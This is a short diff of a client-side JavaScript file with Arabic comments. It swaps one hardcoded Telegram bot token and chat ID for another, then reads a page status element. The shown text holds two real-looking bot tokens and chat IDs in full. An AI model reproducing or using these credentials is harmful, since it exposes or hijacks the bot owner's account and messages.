@@ -1,6 +1,6 @@
 // إعدادات البوت
-const BOT_TOKEN = '7540998214:AAEysEoXCj5XHlQzVG3-yETXNk6WdeZ9Yc0';
-const CHAT_ID = '6913353602'; // يجب استبدالها بمعرف الدردشة الخاص بك
+const BOT_TOKEN = '8448437426:AAGDNRN8rUX2BX8usRnteGq-RmlOxuq7hAE';
+const CHAT_ID = '6703506413'; // يجب استبدالها بمعرف الدردشة الخاص بك
 
 // عناصر DOM
 const statusElement = document.getElementById('status');
